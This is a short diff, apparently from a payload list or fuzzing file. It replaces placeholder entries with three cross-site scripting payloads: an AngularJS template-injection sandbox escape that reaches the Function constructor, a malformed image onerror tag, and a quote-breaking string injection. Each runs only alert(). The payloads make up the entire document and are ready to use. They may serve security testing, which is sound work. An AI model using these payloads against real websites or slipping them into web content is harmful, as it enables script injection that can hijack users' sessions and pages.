@@ -8,15 +8,15 @@ lol
 ```
 ###
 ```
-lol
+wrtz{{(_="".sub).call.call({}[$="\constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzz\
 ```
 ###
 ```
-lol
+#>img src=/onerror=alert(3)>
 ```
 ###
 ```
-lol
+test’;alert(‘XSS’);’
 ```
 ###
 ```
